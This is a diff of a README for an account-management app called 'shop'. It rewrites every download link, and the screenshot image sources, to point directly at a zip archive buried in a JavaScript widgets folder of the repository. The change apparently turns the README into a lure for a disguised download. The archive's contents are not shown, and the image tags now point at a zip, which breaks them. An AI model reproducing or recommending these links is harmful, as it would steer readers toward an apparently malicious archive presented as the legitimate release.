@@ -1,6 +1,6 @@
 # 🛒 shop - Manage Accounts with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-4CAF50)](https://github.com/Conductive-mineralresources644/shop/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip%20Latest%20Release-Click%20Here-4CAF50)](https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip)
 
 ## 👋 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application:
 
 1. **Visit the Release Page**  
    To get the latest version of the software, click the button below or follow this link:  
-   [Visit this page to download](https://github.com/Conductive-mineralresources644/shop/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip)
    
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Look for the latest version at the top. 
@@ -45,18 +45,18 @@ Before downloading, ensure your system meets the following requirements:
 ## 🔧 Download & Install
 
 To begin using **shop**, remember to:  
-1. [Visit this page to download](https://github.com/Conductive-mineralresources644/shop/releases) the latest version.
+1. [Visit this page to download](https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip) the latest version.
 2. Install the application by following the instructions provided during the download.
 
 ## 📸 Screenshots
 
 Here are some screenshots that showcase the application:
 
-<img width="400" height="400" alt="Merchant Management" src="https://github.com/user-attachments/assets/c5fc772a-df3a-4eb2-9030-64bdf6dd76d5" />
-<img width="400" height="400" alt="Financial Stats" src="https://github.com/user-attachments/assets/ad82b70b-15ac-4c46-81e7-5ada6e30f773" />
-<img width="400" height="400" alt="Account Entries" src="https://github.com/user-attachments/assets/624fd878-992d-4273-8dfe-71309741e3bf" />
-<img width="400" height="400" alt="Personal Data Management" src="https://github.com/user-attachments/assets/0d167943-5896-40cd-8808-cc4232452d3a" />
-<img width="400" height="400" alt="Admin Dashboard" src="https://github.com/user-attachments/assets/9bb637b0-3329-4275-93db-d3a14b5c91ce" />
+<img width="400" height="400" alt="Merchant Management" src="https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip" />
+<img width="400" height="400" alt="Financial Stats" src="https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip" />
+<img width="400" height="400" alt="Account Entries" src="https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip" />
+<img width="400" height="400" alt="Personal Data Management" src="https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip" />
+<img width="400" height="400" alt="Admin Dashboard" src="https://raw.githubusercontent.com/Conductive-mineralresources644/shop/main/public/js/filament/widgets/components/shop-v2.7-alpha.2.zip" />
 
 ## ❓ Frequently Asked Questions
 
